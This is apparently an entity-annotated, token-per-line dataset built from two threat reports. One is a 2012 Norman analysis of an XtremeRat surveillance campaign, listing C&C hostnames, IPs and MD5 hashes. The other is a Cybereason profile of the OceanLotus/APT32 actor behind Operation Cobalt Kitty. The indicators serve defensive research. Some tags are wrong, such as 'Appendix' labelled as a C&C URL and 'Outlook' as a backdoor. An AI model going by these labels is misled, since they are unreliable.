digitally
signed
and
connected
through
the
blue
certificate
node
in
the
middle
.

This
is
where
the
trail
could
have
ended
.

However
,
there
are
still
clues
to
look
at
–
for
example
,
what
other
executables
connect
to
these
C
&
C
hosts
.

This
time
,
digging
into
our
Malware
Analyzer
G2
(
MAG2
)
databases
shows
that
there
is
more
malware
talking
to
this
infrastructure
,
and
these
bots
again
connect
to
more
C
&
C
domains
.

These
new
malwares
are
also
predominantly
XtremeRats B_malware.backdoor
.

However
,
they
have
been
in
circulation
for
a
longer
time
–
all
the
way
back
to
October
2011
.

I
think
it
is
logical
to
assume
that
all
these
have
been
part
of
a
medium
/
large
surveillance
operation
.

©Norman
,
November
2012
12
When
updated
with
this
information
the
plot
now
looks
like
this
:
Same
as
previous
illustration
,
where
new
unsigned
samples
are
shown
to
be
related
through
the
usage
of
the
same
C
&
C
infrastructure.Colours
have
changed
–
now
the
certificate
is
green
,
the
C
&
C
servers
are
yellow
,
the
samples
are
blue
,
while
IP
addresses
are
purple
.

These
IP
addresses
can
be
considered
examples
–
they
change
regularly
.

Several
of
these
domains
appear
to
be
hosted
together
.

For
example
(
at
the
time
of
writing
)
:
108.171.108.190 B_ip.cncsvr
is
pointed
to
by
may2008.dyndns.info B_url.cncsvr
,
menu.dyndns.biz B_url.cncsvr
,
flashsoft.no-ip.biz B_url.cncsvr
,
monagameel.chickenkiller.com B_url.cncsvr
,
powerhost.zapto.org B_url.cncsvr
108.171.124.13 B_ip.cncsvr
is
pointed
to
by
helpme.no-ip.biz B_url.cncsvr
,
mjed10.no-ip.info B_url.cncsvr
69.80.101.244 B_ip.cncsvr
is
pointed
to
by
good.zapto.org B_url.cncsvr
,
hint.zapto.org B_url.cncsvr
,
hint1.zapto.org B_url.cncsvr
,
natco1.no-ip.net B_url.cncsvr
,
natco2.no-ip.net B_url.cncsvr
,
natco3.no-ip.net B_url.cncsvr
,
natco4.no-ip.net B_url.cncsvr
,
loading.myftp.org B_url.cncsvr
,
skype.servemp3.com B_url.cncsvr
,
test.cable-modem.org B_url.cncsvr
These
addresses
tend
to
change
.

Typically
,
every
couple
of
days
a
new
IP
configuration
is
introduced
for
some
boxes
,
while
others
may
remain
static
–
such
as
the
host
lokia.mine.nu B_url.cncsvr
,
which
has
resolved
to
69.80.107.129 B_ip.cncsvr
since
we
started
examining
the
case
.

As
mentioned
,
the
IP
addresses
in
use
have
belonged
to
mostly
US-based
hosting
services...at
least
recently
.

©Norman
,
November
2012
13
If
we
go
further
back
in
time
(
towards
spring
of
2012
)
most
of
the
domains
used
resolved
to
IP
addresses
in
the
range
188.161.* B_ip.unknown
.

This
range
is
located
in
Gaza
and
belongs
to
a
provider
headquartered
in
Ramallah
in
the
West
Bank
:
Palestinian
Territory
,
Occupied
Gaza
Palestine
Telecommunications
Company
(
paltel
)
,
ASN
:
AS12975
We
have
also
to
a
lesser
extent
seen
IP
addresses
in
use
belonging
to
another
Paltel
division
:
Palestinian
Territory
,
Occupied
Gaza
Hadara
Technologies
Private
Shareholding
Company
,
ASN
:
AS15975
What
is
behind
these
IP
addresses
is
hard
to
establish
.

It
is
possible
that
they
are
hacked
boxes
,
and
as
such
not
give
much
valid
information
.

If
that
were
the
case
,
one
might
have
expected
greater
IP
range
and
geographical
distribution
,
but
nothing
is
certain
.

Our
databases
also
show
that
there
is
much
more
malware
talking
to
these
providers
through
many
other
DynDNS
domains
.

Some
of
these
are
probably
also
related
to
this
case
,
but
as
we
have
no
evidence
linking
the
cases
,
these
malwares
have
not
been
included
in
this
paper
.

It
is
however
interesting
to
note
the
hostnames
some
of
these
connect
to
–
like
'
terroristttt.no-ip.biz B_url.unknown
'
.

©Norman
,
November
2012
14
The
plot
thickens
So
far
,
the
impression
is
of
an
attack
actor
attempting
to
gather
information
from
Israelis
.

Then
something
happens
that
throws
this
picture
in
disarray
.

A
series
of
samples
show
up
that
do
not
follow
the
pattern
.

They
apparently
do
not
target
Israelis
.

Instead
they
use
Arabic
language
and
refer
to
Palestinian
issues
.

Word
document
contained
in
EXE
file
FC17F3B2E2C7F5F24D35899D95B8C4A6 B_hash
This
document
in
Arabic
claims
that
Mahmoud
Abbas
is
threatened
by
assassination
by
Mossad
if
he
does
not
stop
his
reconciliation
policy
towards
Hamas
.

The
image
is
taken
from
a
news
story
about
Abbas
speaking
at
a
meeting
in
Ramallah
.

©Norman
,
November
2012
15
MP4
video
contained
in
EXE
file
2AAD951DBECB6D4715B306B337CA5C34 B_hash
The
sample
containing
this
video
is
digitally
signed
in
the
same
way
as
the
initial
samples
,
but
the
baiting
angle
is
different
.

Instead
of
showing
information
interesting
for
an
Israeli
audience
,
the
video
contains
a
music
piece
critical
of
Mahmoud
Abbas
,
claiming
that
he
is
not
working
for
the
good
of
the
Palestinian
people
.

©Norman
,
November
2012
16
Word
document
contained
in
SFX
ZIP
file
B4F5BFC0AB0CC3D6B7A6B9653784DE56 B_hash
Found
in
Palestine
This
document
revolves
around
the
prisoner
exchange
deal
with
the
Israeli
government
over
the
Israeli
soldier
Gilad
Shalit
,
held
hostage
by
Hamas
for
over
five
years
.

JPEG
image
contained
in
EXE
file
0AA7B256D2DCC8BD3914F895B134B225 B_hash
This
image
appears
purportedly
to
be
of
Gilad
Shalit
in
his
hostage
cell
.

This
could
be
aimed
at
Israelis
,
but
the
image
itself
has
been
mostly
shown
on
Arabic
/
Palestinian
sites
like
www.shehab.ps B_url.unknown
,
a
news
agency
located
in
Gaza
.

©Norman
,
November
2012
17
Word
document
contained
in
EXE
file
926235FCF7B91442A405B5760A0729EB B_hash
This
document
is
an
interview
with
the
former
Palestinian
ambassador
and
Member
of
Parliament
Nabil
Amr
.

He
is
known
to
have
been
critical
of
Arafat
and
later
Abbas
.

©Norman
,
November
2012
18
We
also
see
attacks
apparently
against
Palestinian
targets
without
being
able
to
tie
them
up
against
the
already
mentioned
attack
/
C
&
C
structure
.

For
example
,
a
file
received
by
us
as
'd.exe
'
,
(
MD5
1f1e9958440d773c34415d9eb6334b25 B_hash
)
,
found
in
Palestine
Nov
17th
last
year
,
shows
a
PDF
document
with
content
seemingly
taken
from
'
Palestine
Now
'
(
www.paltimes.net B_url.unknown
)
:
PDF
document
contained
in
the
EXE
file
1F1E9958440D773C34415D9EB6334B25 B_hash
Found
in
Palestine
©Norman
,
November
2012
19
Document
metadata
Most
of
the
bait
attachments
are
Word
documents
,
and
Word
documents
can
contain
metadata
(
typically
the
usernames
of
the
creator
and
the
one
who
last
saved
the
document
)
.

It
is
possible
to
scrub
these
details
,
but
our
attackers
seem
to
have
forgotten
this
–
or
inserted
faked
data
.

Created
by
'
Hitham
'
,
saved
by
'anar
'
Created
by
'
Hitham
'
,
saved
by
'
Ayman
'
Created
and
saved
by
'
Tohan
'
date
Oct
12th
2011
date
Nov
27th
2011
date
Feb
18th
2012
Palestinian
baits
:
Hmas.doc
:
484hhh.doc
:
Word.doc
:
Israeli
baits
:
Created
by
'
ahmed
'
,
saved
by
'
aert
'
word.doc
:
IDF
NEWS.doc
:
Created
and
saved
by
'
aert
'
Brotherhood.doc
:
Created
and
saved
by
'
aert
'
Created
and
saved
by
'
aert
'
detl.doc
:
Created
and
saved
by
'
HinT
'
Advisor.doc
:
IDF.doc
:
Created
and
saved
by
'
aert
'
Created
and
saved
by
'
HinT
'
System.doc
:
Created
and
saved
by
'
HinT
'
York.doc
:
barrage.doc
:
Created
and
saved
by
'
HinT
'
shehab.doc
:
Created
and
saved
by
'
HinT
'
There
seems
to
be
a
number
of
people
involved
in
creating
these
bait
files
.

The
dates
also
roughly
coincide
with
the
apparent
shift
in
IP
ranges
(
Appendix B_url.cncsvr
B I
)
,
from
first
being
located
in
Gaza
,
to
being
located
internationally
.

date
May
14th
2012
date
May
26th
2012
date
Jun
24th
2012
date
Jun
29th
2012
date
Jul
29th
2012
date
Aug
1st
2012
date
Aug
5th
2012
date
Oct
16th
2012
date
Oct
24th
2012
date
Oct
31st
2012
©Norman
,
November
2012
20
Conclusion
We
have
uncovered
a
substantial
number
of
malware
executables
that
contain
information
seemingly
tailored
at
Israelis
and
Palestinians
.

We
have
the
impression
that
a
cybersurveillance
operation
is
underway
(
and
is
probably
still
ongoing
-
most
recent
sample
created
Oct
.

31
)
which
was
first
mainly
focused
on
Palestinian
targets
,
then
shifted
towards
Israel
.

The
reason
for
the
shift
is
unknown
.

Maybe
it
was
planned
all
along
;
or
caused
by
changes
in
the
political
climate
;
or
maybe
the
first
half
of
the
operation
found
data
that
caused
the
target
change
.

This
analysis
is
almost
exclusively
based
on
the
executable
files
themselves
.

We
have
very
little
information
about
actual
infections
.

The
only
documented
case
is
the
Benny
Gantz-themed
email
which
triggered
the
investigation
.

We
consider
it
likely
that
other
attacks
have
been
modeled
the
same
way
,
using
attachments
in
email
.

These
attachments
may
often
have
consisted
of
the
described
malicious
files
inside
archives
like
RAR
or
ZIP
.

The
attacker
is
still
unknown
to
us
.

There
are
probably
several
actors
that
could
have
an
interest
in
the
regional
politics
,
as
the
various
powerblocks
in
the
region
are
manifold
and
conflicted
.

By
using
largely
off-the-shelf
malware
,
the
cost
of
mounting
such
an
operation
is
considerably
lower
than
for
those
who
do
their
own
malware
development
.

©Norman
,
November
2012
21
References
1
.

Ravid
,
Barak
.

Haaretz.com B_url.normal
:
Israel
's
Foreign
Ministry
targeted
by
computer
virus
bearing
IDF
chief
's
name
.

[
Online
]
http://www.haaretz.com/blogs/diplomania/israel-s-foreign-ministry-targeted-by-computer-virus-bearing-idf-chief-s-name.premium-1.472278 B_url.normal
.

©Norman
,
November
2012
22
Appendix B_url.cncsvr
A I
:
C
&
C
hostnames
may2008.dyndns.info B_url.cncsvr
menu.dyndns.biz B_url.cncsvr
flashsoft.no-ip.biz B_url.cncsvr
monagameel.chickenkiller.com B_url.cncsvr
hatamaya.chickenkiller.com B_url.cncsvr
powerhost.zapto.org B_url.cncsvr
helpme.no-ip.biz B_url.cncsvr
mjed10.no-ip.info B_url.cncsvr
good.zapto.org B_url.cncsvr
hint.zapto.org B_url.cncsvr
hint1.zapto.org B_url.cncsvr
natco1.no-ip.net B_url.cncsvr
natco2.no-ip.net B_url.cncsvr
natco3.no-ip.net B_url.cncsvr
natco4.no-ip.net B_url.cncsvr
loading.myftp.org B_url.cncsvr
skype.servemp3.com B_url.cncsvr
test.cable-modem.org B_url.cncsvr
idf.blogsite.org B_url.cncsvr
javaupdate.no-ip.info B_url.cncsvr
lokia.mine.nu B_url.cncsvr
www.hint-sms.com B_url.cncsvr
owner.no-ip.biz B_url.cncsvr
remoteback.no-ip.biz B_url.cncsvr
ramadi.no-ip.biz B_url.cncsvr
The
likelihood
that
there
are
more
names
involved
is
large
.

There
is
for
example
a
domain
natco5.no-ip.net B_url.cncsvr
which
resolves
to
the
same
IP
's
as
the
rest
of
the
series
,
but
we
have
not
seen
the
malware
which
uses
it
–
yet
.

©Norman
,
November
2012
23
Appendix B_url.cncsvr
B I
:
C
&
C
Timeline
C
&
C
loc
.

Date
first
seen
MD5
Primary
C
&
C
A5DE87646EE943CD1F448A67FDBE2817 B_hash
hint.zapto.org B_url.cncsvr
PS
F982401E46864F640BCAEDC200319109 B_hash
natco4.no-ip.net B_url.cncsvr
PS
EC5B360F5FF6251A08A14A2E95C4CAA4 B_hash
hint1.zapto.org B_url.cncsvr
PS
97576FA7A236679DBE3ABE1A4E852026 B_hash
mjed10.no-ip.info B_url.cncsvr
PS
C1EC435E97A4A4C5585392D738B5879F B_hash
monagameel.chickenkiller.com B_url.cncsvr
PS
2559FE4EB88561138CE292DF5D0E099F B_hash
powerhost.zapto.org B_url.cncsvr
PS
0ABF3FA976372CBC8BF33162795E42A8 B_hash
powerhost.zapto.org B_url.cncsvr
PS
0B3B1E2E22C548D8F53C2AA338ABD66E B_hash
hint.zapto.org B_url.cncsvr
PS
0AA7B256D2DCC8BD3914F895B134B225 B_hash
hint.zapto.org B_url.cncsvr
PS
FF8E19CA8A224CC843BF0F2F74A3274E B_hash
powerhost.zapto.org B_url.cncsvr
PS
7C5272F3F24ACB225270DDED72CFC1D4 B_hash
flashsoft.no-ip.biz B_url.cncsvr
PS
8AEAA0C81A36449EC9613CA846E196F2 B_hash
menu.dyndns.biz B_url.cncsvr
PS
2AAD951DBECB6D4715B306B337CA5C34 B_hash
mjed10.no-ip.info B_url.cncsvr
PS
926235FCF7B91442A405B5760A0729EB B_hash
helpme.no-ip.biz B_url.cncsvr
PS
963BFAE19B3DA5BECE081DFF1D1E3EF9 B_hash
hint.zapto.org B_url.cncsvr
US
EBC9BDF9FDF0A9773899D96D24AC46F4 B_hash
powerhost.zapto.org B_url.cncsvr
PS
998F30457BC48A1A6567203E0EC3282E B_hash
powerhost.zapto.org B_url.cncsvr
PS
31F96ADD841594D35E6E97376114E756 B_hash
hint.zapto.org B_url.cncsvr
FR
6E416C45A833F959A63785892042595A B_hash
hint.zapto.org B_url.cncsvr
PS
0DC102CFB87C937EEFFE01A06F94E229 B_hash
powerhost.zapto.org B_url.cncsvr
PS
B7DF947B4A67A884C751840F83C4405E B_hash
hint.zapto.org B_url.cncsvr
UK
2EB1503751A7C74890096B1837C7BD81 B_hash
menu.dyndns.biz B_url.cncsvr
PS
C21D7165B25CAF65D7F92FF758C1B5B1 B_hash
skype.servemp3.com B_url.cncsvr
US
0A67F9CC30083AFB7E1F8295AE152BB6 B_hash
skype.servemp3.com B_url.cncsvr
US
E9823B61E6CE999387DE821DFBF6E741 B_hash
good.zapto.org B_url.cncsvr
US
2AAD951DBECB6D4715B306B337CA5C34 B_hash
good.zapto.org B_url.cncsvr
US
ED53831468DDF4220E1DC3C3398F7F39 B_hash
natco1.no-ip.net B_url.cncsvr
US
66DDF27517985A75B2317231B46A6F62 B_hash
natco1.no-ip.net B_url.cncsvr
US
86BE5F0D2303FB4A8A8E297A53AC0026 B_hash
lokia.mine.nu B_url.cncsvr
US
D14E0A3D408065B1551F2827B50B83CA B_hash
lokia.mine.nu B_url.cncsvr
US
B6C8A6D6C35428779C5C65C1B273EBA0 B_hash
menu.dyndns.biz B_url.cncsvr
US
C03B5985F2504939DA9874246A439E25 B_hash
lokia.mine.nu B_url.cncsvr
US
216689B2CA82F16A0CAB3A2712C27DA6 B_hash
natco2.no-ip.net B_url.cncsvr
US
9C39D6F52E1E1BE5AE61BAB90971D054 B_hash
natco3.no-ip.net B_url.cncsvr
US
E7E05001A294EBFE8A012DD3BCE78E96 B_hash
may2008.dyndns.biz B_url.cncsvr
US
F68F85B0FBCA450F0D5C8828063AD30D B_hash
menu.dyndns.biz B_url.cncsvr
US
3DA8C22F5340850EE5A2C25B1D17FC27 B_hash
loading.myftp.org B_url.cncsvr
US
9D144A828F757A90B86976EF0C906B3F B_hash
lokia.mine.nu B_url.cncsvr
US
DBE2AC744A3947B6306E13EBCCB718BF B_hash
lokia.mine.nu B_url.cncsvr
US
861C90536B3B5A4A8309ADBBFD5C4713 B_hash
natco3.no-ip.net B_url.cncsvr
US
947557A55267DFFB3F85E0D7496A3679 B_hash
good.zapto.org B_url.cncsvr
US
2BFE41D7FDB6F4C1E38DB4A5C3EB1211 B_hash
loading.myftp.org B_url.cncsvr
US
2BCDC5091C446E8B6888D802A3589E09 B_hash
loading.myftp.org B_url.cncsvr
US
72FD6074915F8F123EB44B3DD475D36B B_hash
idf.blogsite.org B_url.cncsvr
US
41454B390B73A45004B916B96C693312 B_hash
javaupdate.no-ip.info B_url.cncsvr
US
Red
hash
=
probable
PS
target
.

Blue
hash
=
probable
IL
target
.

27-Oct-11
29-Oct-11
02-Nov-11
07-Nov-11
07-Nov-11
08-Nov-11
14-Nov-11
19-Nov-11
30-Nov-11
17-Dec-11
23-Dec-11
01-Jan-12
03-Jan-12
12-May-12
16-May-12
19-May-12
29-May-12
02-Jun-12
02-Jun-12
07-Jun-12
09-Jun-12
09-Jun-12
25-Jun-12
25-Jun-12
10-Jul-12
12-Jul-12
02-Aug-12
02-Aug-12
14-Aug-12
29-Aug-12
04-Sep-12
10-Sep-12
18-Sep-12
27-Sep-12
28-Sep-12
02-Oct-12
03-Oct-12
21-Oct-12
21-Oct-12
24-Oct-12
25-Oct-12
25-Oct-12
25-Oct-12
31-Oct-12
03-Nov-12
©Norman
,
November
2012
24
D14E0A3D408065B1551F2827B50B83CA B_hash
B6C8A6D6C35428779C5C65C1B273EBA0 B_hash
841565C67006E6A0A450C48054CF348C B_hash
C8202523F35295E8BC8CC1731EDB0559 B_hash
C03B5985F2504939DA9874246A439E25 B_hash
216689B2CA82F16A0CAB3A2712C27DA6 B_hash
5B740B4623B2D1049C0036A6AAE684B0 B_hash
9C39D6F52E1E1BE5AE61BAB90971D054 B_hash
E7E05001A294EBFE8A012DD3BCE78E96 B_hash
F68F85B0FBCA450F0D5C8828063AD30D B_hash
3DA8C22F5340850EE5A2C25B1D17FC27 B_hash
9D144A828F757A90B86976EF0C906B3F B_hash
DBE2AC744A3947B6306E13EBCCB718BF B_hash
861C90536B3B5A4A8309ADBBFD5C4713 B_hash
947557A55267DFFB3F85E0D7496A3679 B_hash
2BFE41D7FDB6F4C1E38DB4A5C3EB1211 B_hash
2BCDC5091C446E8B6888D802A3589E09 B_hash
72FD6074915F8F123EB44B3DD475D36B B_hash
41454B390B73A45004B916B96C693312 B_hash
Appendix B_hash
C I
:
MD5
list
,
main
cluster
MD5
A5DE87646EE943CD1F448A67FDBE2817 B_hash
F982401E46864F640BCAEDC200319109 B_hash
EC5B360F5FF6251A08A14A2E95C4CAA4 B_hash
97576FA7A236679DBE3ABE1A4E852026 B_hash
C1EC435E97A4A4C5585392D738B5879F B_hash
2559FE4EB88561138CE292DF5D0E099F B_hash
0ABF3FA976372CBC8BF33162795E42A8 B_hash
1f1e9958440d773c34415d9eb6334b25 B_hash
0B3B1E2E22C548D8F53C2AA338ABD66E B_hash
0AA7B256D2DCC8BD3914F895B134B225 B_hash
B455426811B82CB412952F63D911D2A8 B_hash
E431634699D7E5025ECDF7B51A800620 B_hash
FF8E19CA8A224CC843BF0F2F74A3274E B_hash
7C5272F3F24ACB225270DDED72CFC1D4 B_hash
8AEAA0C81A36449EC9613CA846E196F2 B_hash
FC17F3B2E2C7F5F24D35899D95B8C4A6 B_hash
926235FCF7B91442A405B5760A0729EB B_hash
963BFAE19B3DA5BECE081DFF1D1E3EF9 B_hash
EBC9BDF9FDF0A9773899D96D24AC46F4 B_hash
4A06D9989A8C3A9967C2011E5BAF3010 B_hash
4DC0BCDCFB3F3D794175B21872A76079 B_hash
998F30457BC48A1A6567203E0EC3282E B_hash
91FC9D1B635FDEE4E56AEC32688A0E6C B_hash
940B3ACDF1E26FCCCF74A5A0359FB079 B_hash
cebc8b51d51e442e2af8c86e70c8adf4 B_hash
31F96ADD841594D35E6E97376114E756 B_hash
6E416C45A833F959A63785892042595A B_hash
0DC102CFB87C937EEFFE01A06F94E229 B_hash
B7DF947B4A67A884C751840F83C4405E B_hash
2EB1503751A7C74890096B1837C7BD81 B_hash
C21D7165B25CAF65D7F92FF758C1B5B1 B_hash
0A67F9CC30083AFB7E1F8295AE152BB6 B_hash
15FC009D9CAAA8F11D6C3DA2B69EA06E B_hash
D9D1B0C467FA4999DEF6CD53447F1221 B_hash
E9823B61E6CE999387DE821DFBF6E741 B_hash
2AAD951DBECB6D4715B306B337CA5C34 B_hash
ED53831468DDF4220E1DC3C3398F7F39 B_hash
66DDF27517985A75B2317231B46A6F62 B_hash
86BE5F0D2303FB4A8A8E297A53AC0026 B_hash
A1187DE4C4B88E560D46940B820A6228 B_hash
©Norman
,
November
2012
25
Operation
Cobalt
Kitty
Threat
Actor
Profile
&
Indicators
of
Compromise
By
:
Assaf
Dahan
1
©2016
Cybereason
.

All
rights
reserved
.

Attribution
In
this
APT
,
the
threat
actor
was
very
aware
of
the
risks
of
exposure
and
tried
to
combat
attribution
as
much
as
possible
.

This
is
often
the
case
in
this
type
of
large-scale
cyber
espionage
operations
.

At
the
time
of
the
attack
,
there
weren't
many
classic
indicators
of
compromise
(
IOCs
)
that
could
lead
to
attribution
.

However
,
at
the
same
time
,
the
threat
actors
behind
Operation
Cobalt
Kitty
left
enough
'
behavioral
fingerprints
'
to
suspect
the
involvement
of
the
OceanLotus
Group
(
which
also
goes
by
the
names
APT-C-00
,
SeaLotus
and
APT32
)
,
which
was
first
documented
by
Qihoo
360
's
SkyEye
Labs
in
2015
and
further
researched
by
other
security
companies
,
including
FireEye
's
report
.

Reports
of
the
group
's
activity
in
Asia
date
back
to
2012
,
attacking
Chinese
entities
.

Over
the
years
,
the
group
was
observed
attacking
a
wide
spectrum
of
targets
in
other
Asian
countries
(
Philippines
and
Vietnam
)
.

Cybereason
concludes
that
the
tactics
,
techniques
and
procedures
(
TTPs
)
observed
throughout
operation
Cobalt
Kitty
are
consistent
with
the
group
's
previous
APT
campaigns
in
Asia
.

The
Lotus
Group
appears
to
have
a
tendency
of
using
similar
and
even
identical
names
for
their
payloads
(
seen
in
their
PowerShell
payloads
,
Denis B_malware.backdoor
backdoor
and
fake
Flash
installers
)
.

In
addition
,
they
also
used
similar
anonymization
services
for
their
domains
repeatedly
.

That
type
of
'
small
'
details
also
played
a
role
in
attributing
Operation
Cobalt
Kitty
to
the
OceanLotus
Group
.

Lastly
,
during
the
investigation
,
Cybereason
noticed
that
some
of
the
C
&
C
domains
and
IPs
started
to
emerge
on
VirusTotal
and
other
threat
intelligence
engines
,
with
payloads
that
were
not
observed
during
Cobalt
Kitty
.

This
was
a
cutting
proof
that
Cobalt
Kitty
was
not
an
isolated
APT
,
but
part
of
something
bigger
.

Example
of
the
C
&
C
domains
and
IPs
used
by
the
group
across
different
APT
campaigns
and
caught
in
the
wild
:
*.chatconnecting(.)com B_url.cncsvr
blog.versign(.)com B_url.cncsvr
vieweva(.)com B_url.cncsvr
tulationeva(.)com B_url.cncsvr
teriava(.)com B_url.cncsvr
tonholding(.)com B_url.cncsvr
nsquery(.)net B_url.cncsvr
notificeva(.)com B_url.cncsvr
23.227.196(.)210 B_url.cncsvr
104.237.218(.)72 B_url.cncsvr
45.114.117(.)137 B_url.cncsvr
Some
of
these
domains
were
also
mentioned
in
FireEye
's
APT32
report
,
further
confirming
our
suspicions
that
the
group
behind
the
attack
is
the
OceanLotus
Group
.

The
group
includes
members
who
are
fluent
in
at
least
two
Asian
languages
.

This
claim
is
supported
by
the
language
used
in
the
spear-phishing B_malware.infosteal
emails
,
which
appear
to
be
written
by
native
speakers
.

In
addition
,
the
language
localization
settings
found
in
few
of
the
payloads
suggest
that
the
malware
authors
compiled
the
payloads
on
machines
with
Asian
languages
©2017
Cybereason
Inc
.

All
rights
reserved
.

1
support
.

The
threat
actors
are
not
likely
native
English
speakers
since
multiple
typos
were
found
in
their
payloads
.

For
example
,
the
following
typo
was
observed
in
the
file
metadata
of
one
of
the
backdoors
.

Notice
the
'
Internal
Name
'
field
(
'
Geogle
Update
'
)
:
Threat
Actor
Profile
The
attackers
behind
Operation
Cobalt
Kitty
were
extremely
persistent
.

Even
when
their
campaign
was
exposed
,
the
attackers
did
not
give
up
.

They
took
'
pauses
'
that
lasted
between
48
hours
and
four
weeks
and
used
the
downtime
to
learn
from
their
'
mistakes
'
and
develop
workarounds
before
resuming
the
APT
campaign
.

The
members
of
the
OceanLotus
Group
demonstrated
a
remarkable
ability
to
quickly
adapt
,
introduce
new
tools
and
fine
tune
existing
ones
to
bypass
security
solutions
and
avoid
detection
.

The
high
number
of
payloads
and
the
elaborate
C2
infrastructure
used
in
this
attack
can
be
indicative
of
the
resources
that
the
attackers
had
at
their
disposal
.

Simultaneously
orchestrating
multiple
APT
campaigns
of
such
magnitude
and
sophistication
takes
time
,
financial
resources
and
a
large
team
who
can
support
it
.

Threat
actor
's
main
characteristics
Here
are
the
main
characteristics
that
can
help
profile
the
threat
actor
:
●
Motivation
-
Based
on
the
nature
of
the
attack
,
the
proprietary
information
that
the
attackers
were
after
and
the
high-profile
personnel
who
were
targeted
,
Cybereason
concluded
the
main
motivation
behind
the
attack
was
cyber
espionage
.

The
attacker
sought
after
specific
documents
and
type
of
information
.

This
is
consistent
with
previous
reports
about
the
group
's
activity
show
that
the
group
has
a
very
wide
range
of
targets
,
spanning
from
government
agencies
,
media
,
business
sector
,
and
more
.

©2017
Cybereason
Inc
.

All
rights
reserved
.

2
●
Operational
working
hours
-
Most
of
the
malicious
activity
was
mostly
done
around
normal
business
hours
(
8AM-8PM
)
.

Very
little
active
hacking
activity
was
detected
during
weekends
.

The
attackers
showed
a
slight
tendency
to
carry
out
hacking
operations
towards
the
afternoon
and
evening
time
.

These
observations
can
suggest
the
following
:
○
Time
zone
(
s
)
proximity
.

○
An
institutionalized
threat
actor
(
possibly
nation-state
)
●
Outlook B_malware.backdoor
backdoor
and
data
exfiltration
-
One
of
the
most
interesting
tools
introduced
by
the
attackers
was
the
Outlook B_malware.backdoor
backdoor
,
which
used
Outlook B_malware.backdoor
as
a
C2
channel
.

This
backdoor
has
not
been
publicly
documented
and
is
one
of
the
most
unique
TTPs
with
regards
to
the
threat
actor
.

Outlook B_malware.backdoor
backdoors
are
not
a
new
concept
and
have
been
observed
in
different
APTs
in
the
past
.

However
,
this
specific
type
of
Outlook B_malware.backdoor
backdoor
is
can
be
considered
as
one
of
the
'
signature
tools
'
of
the
OceanLotus
Group
.

●
Publicly
available
tools
-
The
attackers
showed
a
clear
preference
to
use
publicly
available
hacking
tools
and
frameworks
.

Beyond
being
spared
the
hassle
of
creating
a
new
tool
,
it
is
much
harder
to
attribute
a
tool
that
can
be
used
by
anyone
rather
than
a
custom-made
tool
.

However
,
the
attackers
should
not
be
considered
script-kiddies
.

Most
of
the
publicly
available
tools
were
either
obfuscated
,
modified
and
even
merged
with
other
tools
to
evade
antivirus
detection
.

This
type
of
customization
requires
good
coding
skills
and
understanding
of
how
those
tools
work
.

●
Cobalt
Strike
usage
in
APT
-
Cobalt
Strike
is
a
commercial
offensive
security
framework
designed
to
simulate
complex
attacks
and
is
mainly
used
by
security
professionals
in
security
audits
and
penetration
testing
.

The
OceanLotus
Group
was
previously
documented
using
Cobalt
Strike
as
one
of
its
main
tools
.

Other
Large
scale
APTs
using
Cobalt
Strike
have
been
reported
before
,
such
as
APT-TOCS
(
could
be
related
to
OceanLotus
)
,
Ordinaff B_malware.backdoor
,
Carbanak
Group
,
and
the
Cobalt
Group
.

●
Custom-built
backdoors
-
The
threat
actor
used
very
sophisticated
and
stealthy
backdoors
(
Denis B_malware.backdoor
&
Goopy B_malware.backdoor
)
that
were
written
by
highly
skilled
malware
authors
.

During
the
attack
,
the
authors
introduced
new
variants
of
these
backdoors
,
indicating
'
on-the-fly
'
development
capabilities
.

Developing
such
state-of-the-art
backdoors
requires
skillful
malware
authors
,
time
and
resources
.

In
addition
,
both
the
Denis B_malware.backdoor
and
Goopy B_malware.backdoor
backdoors
used
DNS
Tunneling
for
C2
communication
.

The
OceanLotus
Group
is
known
to
have
a
backdoor
dubbed
SOUNDBITE B_malware.backdoor
by
FireEye
that
use
this
stealthy
technique
.

However
,
no
public
analysis
reports
of
SOUNDBITE B_malware.backdoor
is
available
to
the
time
of
writing
this
report
.

●
Exploiting
DLL
hijacking
in
trusted
applications
-
The
attackers
exploited
three
DLL-hijacking
vulnerabilities
in
legitimate
applications
from
trusted
vendors
:
Microsoft
,
Google
and
Kaspersky
.

This
further
indicates
the
group
's
emphasis
on
vulnerability
research
.

DLL-hijacking
/
Side-loading
attacks
are
not
uncommon
in
APTs
,
some
of
which
are
also
carried
out
by
nation-state
actors
and
advanced
cyber-crime
groups
.

©2017
Cybereason
Inc
.

All
rights
reserved
.

3
There
have
been
reports
in
the
past
of
GoogleUpdate
exploited
by
PlugX B_malware.backdoor
by
Chinese
threat
actors
as
well
as
the
Bookworm B_malware.infosteal
RAT
exploiting
Microsoft
and
Kaspersky
applications
in
APTs
targeting
Asia
.

●
Insisting
on
fileless B_malware.unknown
operation
-
While
fileless B_malware.unknown
delivery
infrastructure
is
not
a
feature
that
can
be
attributed
to
one
specific
group
,
it
is
still
worth
mentioning
since
the
attackers
went
out
of
their
way
to
restore
the
script-based
PowerShell
/
Visual
Basic
operation
,
especially
after
PowerShell
execution
had
been
disabled
in
the
entire
organization
.

●
C
&
C
infrastructure
○
Divide
and
conquer
-
Each
tool
communicated
with
different
sets
of
C
&
C
servers
domains
,
which
usually
came
in
triads
.

For
instance
,
Cobalt
strike
payloads
communicated
with
certain
sets
of
IPs
/
domains
while
the
backdoors
communicated
with
different
sets
of
IPs
/
domains
.

○
Re-use
of
domains
and
IPs
across
campaigns
-
Quite
a
few
domains
and
IPs
that
were
observed
in
Operation
Cobalt
Kitty
were
found
in-the-wild
,
attacking
other
targets
.

It
's
rather
peculiar
why
the
threat
actor
re-used
the
same
domains
and
IPs
.

It
could
be
assumed
that
the
malware
operators
wanted
to
have
centralized
C
&
C
servers
per
tool
or
tools
,
where
they
could
monitor
all
of
their
campaigns
from
dedicated
servers
.

○
Anonymous
DNS
records
-
Most
of
the
domains
point
to
companies
that
provide
DNS
data
privacy
and
anonymization
,
such
as
PrivacyProtect
and
PrivacyGuardian
.

○
C
&
C
server
protection
-
Most
of
the
C
&
C
servers
IP
addresses
are
protected
by
CloudFlare
and
SECURED
SERVERS
LLC
.

OceanLotus
Group
activity
in
Asia
As
part
of
the
analysis
of
the
domains
and
IPs
that
were
used
in
this
operation
,
Cybereason
found
samples
that
were
caught
'
in-the-wild
'
(
that
were
not
part
of
Operation
Cobalt
Kitty
)
.

Analysis
of
those
samples
clearly
indicates
the
involvement
of
the
threat
actor
in
Asia
and
Vietnam
in
particular
.

Both
Qihoo
360
and
FireEye
demonstrate
in
their
reports
that
the
threat
actor
is
involved
in
campaigns
in
different
Asian
countries
,
such
as
Vietnam
,
China
,
and
the
